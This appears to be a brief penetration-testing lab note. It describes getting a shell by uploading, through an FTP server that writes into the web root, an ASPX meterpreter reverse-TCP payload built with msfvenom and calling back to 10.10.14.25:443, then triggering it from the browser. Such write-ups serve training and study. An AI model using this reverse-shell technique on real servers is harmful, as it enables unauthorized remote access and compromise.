We are able to upload anything in the web directory using `ftp`server

# Reverse Shell using metasploit
---
- We can see that the technology is `asp`, so let's try that
- `msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.25 lport=443 -f aspx -o rev.aspx`
- Upload it on ftp server
- Setup msfconsole with same options and access `rev.aspx`from web
	- ![[Pasted image 20250426160632.png]]
	- ![[Pasted image 20250426160625.png]]
